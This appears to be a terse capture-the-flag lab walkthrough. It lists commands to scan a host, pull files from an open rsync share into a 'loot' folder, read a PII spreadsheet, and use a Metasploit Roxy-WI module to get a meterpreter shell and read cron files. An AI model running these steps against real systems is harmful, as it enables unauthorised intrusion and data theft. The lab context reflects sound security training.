# Flag 1

```linux
nmap target1.ine.local
rsync rsync://192.147.187.3
```


# Flag 2
You can utilize the backupwscohen module to list and download the files stored inside it on the target machine

List the files inside the share
```linux
rsync rsync://192.147.187.3/backupwscohen
```

Download the contents to your machine
```
rsync -av rsync://192.147.187.3/backupwscohen/ ./loot/
```
`-a`: Preserves file permissions and symlinks.
`-v`: Gives you visual feedback on what is being downloaded.
`./loot/`: The local directory where the files will be saved.
```
cd loot
cat pii_data.xlsx 
```

# Flag 3

```MSF
msfconsole  
search Roxy-WI
use 0

set RHOSTS target2.ine.local  
set LHOST eth1  
run
```
```meterpreter
ls
cd ../
cat flag.txt
```

# Flag 4
```meterpreter
ls
cd ../../../
cd /etc
ls
cd cron.d
ls
cat /etc/cron.d/www-data-cron
```